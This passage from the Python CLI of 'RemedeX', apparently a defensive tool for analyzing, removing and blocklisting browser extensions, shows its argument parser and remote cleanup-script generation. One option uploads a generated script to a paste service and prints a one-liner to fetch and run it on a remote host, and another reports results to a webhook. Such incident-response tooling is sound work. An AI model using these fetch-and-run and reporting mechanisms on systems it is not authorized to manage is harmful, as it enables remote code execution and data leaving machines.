                apply_blocklist=not getattr(args, 'no_blocklist', False)
            )
        
        if getattr(args, 'share', False):
            print("Uploading script...")
            try:
                lang = fmt if script_type != "js" else "text"
                result = BrowserExtensionManager.upload_script(script, lang)
                print(f"\nPaste URL:   {result['url']}")
                print(f"Raw URL:     {result['raw_url']}")
                print(f"\nRun on remote host:")
                print(f"  {result['oneliner']}")
                print(f"\nAlternative:")
                print(f"  {result['oneliner_alt']}")
                print(f"\nThe paste expires automatically. Use within 1 day.")
            except Exception as e:
                print(f"Upload failed: {e}", file=sys.stderr)
                sys.exit(1)
        elif args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(script)
            print(f"Script saved to: {args.output}")
        else:
            print(script)
        return


def main():
    parser = argparse.ArgumentParser(
        description="RemedeX — manage, analyze, and clean browser extensions",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  Launch GUI:
    %(prog)s --gui

  List extensions:
    %(prog)s -l                                 List all extensions (Chrome, Edge, Brave)
    %(prog)s -l -b chrome                       List only Chrome extensions
    %(prog)s -l -b chrome,edge --details        List Chrome+Edge with full details

  Remove extension:
    %(prog)s -r <ID>                            Remove extension (prompts first)
    %(prog)s -r <ID> --force --disable-sync     Remove + disable sync + blocklist, no prompt
    %(prog)s -r <ID> --no-blocklist             Remove without adding to policy blocklist

  Analyze extension from folder:
    %(prog)s --scan-path ./downloaded_extensions/ext_id
    %(prog)s --scan-path ./ext_folder --export-report report.html
    %(prog)s --scan-path ./ext_folder --export-graph graph.html
    %(prog)s --scan-path ./ext_folder --vt-api-key YOUR_KEY
    %(prog)s -l --export-report all_extensions.html

  Download from Chrome Web Store:
    %(prog)s -D <ID>                            Download extension by ID
    %(prog)s -D <ID> --extract                  Download and extract
    %(prog)s --download-url <URL> --extract     Download from store URL

  Clean browser data:
    %(prog)s --clean -b chrome                  Clean Chrome data (prompts first)
    %(prog)s --clean-all --force                Clean all browsers, skip prompt
    %(prog)s --clean-all --no-cache --cookies   Clean localStorage+SW+cookies, skip disk cache
    %(prog)s --clean-all --no-storage --no-sw   Only clean disk caches (Cache, Code Cache, etc.)

  Generate remote cleanup scripts:
    %(prog)s -g                                 Generate Python remote script (default)
    %(prog)s -g --script-type powershell        Generate PowerShell script
    %(prog)s -g --script-type bash              Generate Bash script (Linux/Mac)
    %(prog)s -g --script-type js                Generate browser console JS script
    %(prog)s -g --script-type powershell -o cleanup.ps1   Save to file
    %(prog)s -g --share                                 Upload & get one-liner

  Generate extension lister script:
    %(prog)s --generate-lister                              Lister for current OS (stdout)
    %(prog)s --generate-lister --target-os mac              macOS lister script
    %(prog)s --generate-lister --target-os windows -o l.ps1 Save to file
    %(prog)s --generate-lister --extract-iocs --webhook-url URL  Lister with network IOC extraction

  Disable extension sync:
    %(prog)s --disable-sync                     Disable sync for all browsers
    %(prog)s --disable-sync -b chrome           Disable sync for Chrome only
        """
    )
    
    parser.add_argument("--gui", action="store_true",
                       help="Launch graphical user interface")
    
    # Extension analysis
    analysis_group = parser.add_argument_group("Extension Analysis")
    analysis_group.add_argument("--scan-path", type=str, metavar="DIR",
                               help="Scan an extension from a local directory (downloaded/extracted)")
    analysis_group.add_argument("--export-report", type=str, metavar="FILE",
                               help="Export forensic HTML report to FILE (works with -l or --scan-path)")
    analysis_group.add_argument("--export-graph", type=str, metavar="FILE",
                               help="Export interactive extension architecture graph (HTML) — use with --scan-path or extension ID")
    analysis_group.add_argument("--vt-api-key", type=str, metavar="KEY",
                               help="VirusTotal API key for scanning extension files and domains")
    analysis_group.add_argument("--extract-domains", type=str, metavar="FILE",
                               help="Extract all domains/IPs from extensions listed in FILE (one ID per line, or lister output)")
    analysis_group.add_argument("--domains-output", type=str, metavar="FILE",
                               help="Save extracted domains to CSV (use with --extract-domains)")
    analysis_group.add_argument("--enrich", action="store_true",
                               help="Fetch Chrome Web Store metadata (user count, rating, store URL) for listed/scanned extensions")

    # Extension management
    ext_group = parser.add_argument_group("Extension Management")
    ext_group.add_argument("--no-blocklist", action="store_true",
                          help="Skip adding removed extensions to the OS-level policy blocklist (blocklist is ON by default)")
    ext_group.add_argument("--no-blocklist-elevation", action="store_true",
                          help="On Windows, do not prompt UAC when normal registry writes fail (Access Denied)")
    ext_group.add_argument("--list-blocklist", action="store_true",
                          help="List blocklisted extension IDs from Windows registry policy (Windows only)")
    ext_group.add_argument("--clear-blocklist", action="store_true",
                          help="Clear ExtensionInstallBlocklist policy for Chrome, Edge, and Brave (Windows registry)")
    ext_group.add_argument("--unblock-extension", type=str, metavar="ID",
                          help="Remove an extension ID from policy blocklists (Windows registry)")
    ext_group.add_argument("--list-extensions", "-l", action="store_true",
                          help="List installed extensions (Chrome, Edge, Brave)")
    ext_group.add_argument("--details", "-d", action="store_true",
                          help="Show full details (permissions, paths) when listing")
    ext_group.add_argument("--remove-extension", "-r", type=str, metavar="ID",
                          help="Remove an extension by ID from Chrome, Edge, and Brave profiles")
    ext_group.add_argument("--disable-sync", action="store_true",
                          help="Disable extension sync (prevents re-download after removal)")
    ext_group.add_argument("--clean-preferences", action="store_true",
                          help="Also remove extension entries from Preferences/Secure Preferences files "
                               "(may trigger a one-time Chrome recovery prompt)")
    
    # Download
    download_group = parser.add_argument_group("Extension Download")
    download_group.add_argument("--download-extension", "-D", type=str, metavar="ID",
                               help="Download extension from Chrome Web Store by ID")
    download_group.add_argument("--download-url", type=str, metavar="URL",
                               help="Download extension from Chrome Web Store URL")
    download_group.add_argument("--copy-installed", type=str, metavar="ID",
                               help="Copy an installed extension to a folder for analysis")
    download_group.add_argument("--extract", "-e", action="store_true",
                               help="Extract downloaded extension after download")
    download_group.add_argument("--download-dir", type=str, default="./downloaded_extensions",
                               help="Output directory (default: ./downloaded_extensions)")
    
    # Cleanup
    clean_group = parser.add_argument_group("Browser Data Cleanup")
    clean_group.add_argument("--clean", action="store_true",
                            help="Clean browser data for specified browsers (-b)")
    clean_group.add_argument("--clean-all", action="store_true",
                            help="Clean browser data for ALL installed browsers")
    clean_group.add_argument("--no-storage", action="store_true",
                            help="Skip localStorage cleanup")
    clean_group.add_argument("--no-sessionstorage", action="store_true",
                            help="Reserved for generated cleanup scripts; built-in --clean/--clean-all does not clear sessionStorage")
    clean_group.add_argument("--no-cache", action="store_true",
                            help="Skip cache cleanup")
    clean_group.add_argument("--no-sw", action="store_true",
                            help="Skip service worker cleanup")
    clean_group.add_argument("--no-indexeddb", action="store_true",
                            help="Reserved for generated cleanup scripts; built-in --clean/--clean-all does not clear IndexedDB")
    clean_group.add_argument("--cookies", action="store_true",
                            help="Also clean cookies (off by default - logs you out!)")
    
    # Script generation
    script_group = parser.add_argument_group("Remote Script Generation")
    script_group.add_argument("--generate-script", "-g", action="store_true",
                             help="Generate a cleanup script for remote deployment")
    script_group.add_argument("--script-type", type=str, default="python",
                             choices=["python", "powershell", "ps1", "bash", "sh", "js"],
                             help="Script language (default: python)")
    script_group.add_argument("--keys", type=str,
                             help="Comma-separated localStorage keys (for JS scripts)")
    script_group.add_argument("--domains", type=str,
                             help="Comma-separated domains to check (for JS scripts)")
    script_group.add_argument("--generate-lister", action="store_true",
                             help="Generate an extension lister script (lists installed extensions on a remote system)")
    script_group.add_argument("--target-os", type=str, default=None,
                             choices=["windows", "win", "mac", "linux"],
                             help="Target OS for lister script (default: auto-detect current OS)")
    script_group.add_argument("--output", "-o", type=str,
                             help="Save script to file instead of printing")
    script_group.add_argument("--webhook-url", type=str, default="",
                             help="Webhook URL for execution tracking (script sends start/end status with results)")
    script_group.add_argument("--extract-iocs", action="store_true",
                             help="Include network IOC extraction in the lister script (domains/IPs from extension JS files)")
    script_group.add_argument("--share", action="store_true",
                             help="Upload generated script to a temporary paste service and print a one-liner to fetch & run it")
    
    # Global options
    global_group = parser.add_argument_group("Global Options")
    global_group.add_argument("--browsers", "-b", type=str,
                             help="Target browsers, comma-separated (chrome,edge,brave)")
    global_group.add_argument("--force", "-f", action="store_true",
                             help="Skip all confirmation prompts")
    
    args = parser.parse_args()
    
    has_action = any([
        args.gui, args.list_extensions, args.remove_extension,
        args.list_blocklist, args.clear_blocklist, args.unblock_extension,
        args.download_extension, args.download_url, args.copy_installed,
        args.clean, args.clean_all, args.generate_script, args.generate_lister,
        args.disable_sync, args.scan_path, args.extract_domains
    ])
    
    if args.gui:
        run_gui()
    elif has_action:
        run_cli(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
